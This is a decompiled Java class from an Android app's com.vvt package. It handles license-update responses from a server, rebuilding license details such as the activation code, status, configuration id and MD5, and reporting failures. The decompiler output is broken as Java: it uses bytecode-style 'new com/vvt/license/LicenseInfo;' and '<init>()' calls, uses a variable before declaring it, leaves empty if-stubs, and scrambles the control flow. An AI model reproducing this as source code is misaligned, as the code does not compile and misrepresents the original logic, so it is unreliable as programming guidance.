package com.vvt.appengine.a;

import com.vvt.appengine.AppEngine1;
import com.vvt.datadeliverymanager.i;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.phoenix.prot.command.a.l;

class aa
  implements com.vvt.datadeliverymanager.a.a
{
  aa(z paramz) {}
  
  public void a(i parami)
  {
    boolean bool1 = z.a();
    if (bool1) {}
    z localz = this.a;
    boolean bool2 = parami.f();
    String str = parami.e();
    localz.a(bool2, str);
  }
  
  public void b(i parami)
  {
    boolean bool1 = true;
    boolean bool2 = z.a();
    if (bool2) {}
    Object localObject1 = parami.a();
    boolean bool3 = z.a();
    if (bool3) {}
    parami.f();
    String str2 = parami.e();
    boolean bool4 = localObject1 instanceof l;
    com.vvt.license.b localb;
    Object localObject2;
    LicenseInfo localLicenseInfo;
    if (bool4)
    {
      bool4 = z.a();
      if (bool4) {}
      localObject1 = (l)localObject1;
      localb = z.a(this.a).k;
      localObject2 = localb.a();
      localLicenseInfo = new com/vvt/license/LicenseInfo;
      localLicenseInfo.<init>();
      String str3 = ((LicenseInfo)localObject2).getActivationCode();
      localLicenseInfo.setActivationCode(str3);
      localObject2 = ((LicenseInfo)localObject2).getLicenseStatus();
      localLicenseInfo.setLicenseStatus((LicenseStatus)localObject2);
      int i = ((l)localObject1).c();
      localLicenseInfo.setConfigurationId(i);
      localObject1 = ((l)localObject1).b();
      localLicenseInfo.setMd5((byte[])localObject1);
    }
    for (;;)
    {
      try
      {
        bool2 = z.a();
        if (bool2) {}
        localObject1 = this.a;
        localObject1 = z.a((z)localObject1);
        localObject1 = ((AppEngine1)localObject1).o;
        localObject2 = this.a;
        localObject2 = z.a((z)localObject2);
        localObject2 = ((AppEngine1)localObject2).l;
        localObject2 = ((com.vvt.phoneinfo.b)localObject2).d();
        boolean bool5 = true;
        localb.a(localLicenseInfo, (com.vvt.productinfo.a)localObject1, (String)localObject2, bool5);
        localObject1 = str2;
        bool3 = bool1;
      }
      catch (Exception localException)
      {
        bool2 = z.b();
        if (!bool2) {
          continue;
        }
        str1 = "License updating failed!!";
        bool3 = false;
        str2 = null;
        continue;
      }
      this.a.a(bool3, (String)localObject1);
      z.b(this.a).open();
      return;
      String str1 = "Invalid server response data";
      bool3 = false;
      str2 = null;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/aa.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */